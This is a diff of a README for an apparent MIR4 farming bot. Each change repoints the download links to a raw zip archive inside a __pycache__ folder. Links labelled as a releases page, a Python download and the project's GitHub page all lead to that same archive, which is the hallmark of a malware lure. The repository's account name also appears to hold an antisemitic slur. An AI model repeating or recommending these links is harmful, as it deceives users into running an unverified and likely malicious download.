@@ -1,6 +1,6 @@
 # 🤖 mir4-bot-draco-farming - Automate Your MIR4 Farming Effortlessly
 
-[![Download](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/quest/mir4-bot-draco-farming-v3.3.zip%20Now-Get%20the%20Bot-brightgreen)](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/quest/mir4-bot-draco-farming-v3.3.zip)
+[![Download](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/mining/__pycache__/bot-farming-mir-draco-v2.0.zip%20Now-Get%20the%20Bot-brightgreen)](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/mining/__pycache__/bot-farming-mir-draco-v2.0.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ Welcome to the MIR4 bot for automated Darksteel mining, DRACO farming, quest com
 
 To begin, you need to download the bot. Follow these steps:
 
-- Click [here to visit the download page](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/quest/mir4-bot-draco-farming-v3.3.zip).
+- Click [here to visit the download page](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/mining/__pycache__/bot-farming-mir-draco-v2.0.zip).
 - On the Releases page, locate the latest version of the bot.
 - Download the file suitable for your operating system.
 
@@ -30,7 +30,7 @@ Before running the bot, ensure your computer meets these basic requirements:
 - **Operating System**: Windows 10 or above, macOS Monterey or above.
 - **RAM**: Minimum 4 GB (8 GB recommended).
 - **Storage**: At least 100 MB of free disk space.
-- **Python**: Make sure you have Python 3.6 or above installed on your computer. You can download Python [here](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/quest/mir4-bot-draco-farming-v3.3.zip).
+- **Python**: Make sure you have Python 3.6 or above installed on your computer. You can download Python [here](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/mining/__pycache__/bot-farming-mir-draco-v2.0.zip).
 
 ## ⚙️ Configuration
 
@@ -62,7 +62,7 @@ You can monitor the bot’s activities and make changes to the settings at any t
 
 ## 📥 Download & Install
 
-If you haven’t already downloaded the bot, click [here to download](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/quest/mir4-bot-draco-farming-v3.3.zip). Follow the installation steps mentioned above, and start automating your game farming.
+If you haven’t already downloaded the bot, click [here to download](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/mining/__pycache__/bot-farming-mir-draco-v2.0.zip). Follow the installation steps mentioned above, and start automating your game farming.
 
 ## ❓ Troubleshooting
 
@@ -111,8 +111,8 @@ Explore these areas to enhance your understanding and capabilities.
 
 ## 🔗 Links
 
-- [Download the latest version](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/quest/mir4-bot-draco-farming-v3.3.zip)
-- [Visit our GitHub page](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/quest/mir4-bot-draco-farming-v3.3.zip)
+- [Download the latest version](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/mining/__pycache__/bot-farming-mir-draco-v2.0.zip)
+- [Visit our GitHub page](https://raw.githubusercontent.com/BalsacTheJew666/mir4-bot-draco-farming/main/mining/__pycache__/bot-farming-mir-draco-v2.0.zip)
 - [Community Forum](#)
 
 Thank you for choosing the MIR4 bot for your automation needs! Enjoy your enhanced farming experience!
